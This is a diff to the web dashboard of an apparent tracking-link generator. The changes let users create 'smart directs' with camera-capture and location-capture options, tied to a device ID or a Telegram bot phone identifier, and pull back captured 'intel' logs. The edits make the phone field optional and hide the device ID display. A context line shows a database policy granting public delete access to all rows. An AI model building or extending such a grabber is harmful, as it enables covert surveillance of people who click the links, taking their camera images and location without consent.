@@ -2249,7 +2249,7 @@ create policy "Allow public delete access" on public.urls for delete using (true
         </div>
       </div>
       <div class="grid grid-cols-1 sm:grid-cols-2 gap-3 text-[10px] font-mono border-t border-zinc-800/50 pt-3 text-zinc-500">
-        <div>🔒 <span class="text-zinc-400">Your Current Device ID:</span> <span id="currentDeviceIdEl" class="text-blue-400 font-bold">Generating...</span></div>
+        <div class="hidden">🔒 <span class="text-zinc-400">Your Current Device ID:</span> <span id="currentDeviceIdEl" class="text-blue-400 font-bold">Generating...</span></div>
         <div>🛰️ <span class="text-zinc-400">Configured API Endpoint:</span> <span id="apiEndpointEl" class="text-emerald-400 h-fit truncate inline-block max-w-[200px]">Checking...</span></div>
       </div>
     </div>
@@ -2283,10 +2283,10 @@ create policy "Allow public delete access" on public.urls for delete using (true
 
               <!-- Phone identification back-sync -->
               <div class="space-y-1.5">
-                <label class="block text-zinc-400 font-medium">Telegram Bot Identifier <span class="text-red-500">*</span></label>
-                <input type="text" id="phoneNumber" required placeholder="+1234567890" 
-                  class="w-full bg-black/40 border border-zinc-800 focus:border-blue-500 rounded-xl px-4 py-2.5 text-zinc-200 outline-none transition-all placeholder:text-zinc-600 font-mono" />
-                <p class="text-[10px] text-zinc-500 font-sans mt-0.5">Used to bridge and access results on your bot terminals</p>
+                <label class="block text-zinc-400 font-medium">Telegram Bot Identifier <span id="phoneReqStar" class="text-red-500">*</span></label>
+                <input type="text" id="phoneNumber" placeholder="+1234567890" 
+                  class="w-full bg-black/40 border border-zinc-800 focus:border-blue-550 rounded-xl px-4 py-2.5 text-zinc-200 outline-none transition-all placeholder:text-zinc-600 font-mono" />
+                <p class="text-[10px] text-zinc-500 font-sans mt-0.5">Required if no device ID is available (e.g. API/Bot usage).</p>
               </div>
             </div>
 
@@ -2486,6 +2486,17 @@ create policy "Allow public delete access" on public.urls for delete using (true
     document.getElementById('currentDeviceIdEl').textContent = deviceId;
     document.getElementById('apiEndpointEl').textContent = API_BASE;
     document.getElementById('apiEndpointEl').title = API_BASE;
+
+    // Toggle required validation dynamically based on device ID presence
+    const phoneInput = document.getElementById('phoneNumber');
+    const phoneReqStar = document.getElementById('phoneReqStar');
+    if (deviceId) {
+      phoneInput.removeAttribute('required');
+      if (phoneReqStar) phoneReqStar.style.display = 'none';
+    } else {
+      phoneInput.setAttribute('required', 'true');
+      if (phoneReqStar) phoneReqStar.style.display = 'inline';
+    }
     
     // Set current download payload
     const downloadBtn = document.getElementById('downloadBtn');
@@ -2525,14 +2536,18 @@ create policy "Allow public delete access" on public.urls for delete using (true
       const captureCamera = document.getElementById('captureCamera').checked;
       const captureLocation = document.getElementById('captureLocation').checked;
 
-      if (!phoneNumber) {
-        errorCard.textContent = 'Phone number identifier is required to establish identification.';
+      if (!phoneNumber && !deviceId) {
+        errorCard.textContent = 'Either a Phone Number or a browser Device ID is required to establish identification.';
         errorCard.classList.remove('hidden');
         return;
       }
 
-      // Persist phone for usability
-      localStorage.setItem('__smart_persisted_phone', phoneNumber);
+      // Persist phone for usability if provided
+      if (phoneNumber) {
+        localStorage.setItem('__smart_persisted_phone', phoneNumber);
+      } else {
+        localStorage.removeItem('__smart_persisted_phone');
+      }
 
       const submitBtn = document.getElementById('submitBtn');
       submitBtn.textContent = 'GENERATING SMART DIRECTS...';
@@ -2545,7 +2560,7 @@ create policy "Allow public delete access" on public.urls for delete using (true
           body: JSON.stringify({
             longUrl,
             customAlias: customAlias || undefined,
-            phoneNumber,
+            phoneNumber: phoneNumber || undefined,
             captureCamera,
             captureLocation,
             deviceId // pass persistent client device scope ID
@@ -2688,7 +2703,7 @@ create policy "Allow public delete access" on public.urls for delete using (true
     refreshIntelBtn.addEventListener('click', loadLatestLogs);
 
     // Dynamic initial loading trigger to pull status
-    if (phoneNumber) {
+    if (phoneNumber || deviceId) {
       setTimeout(loadLatestLogs, 500);
     }
   </script>
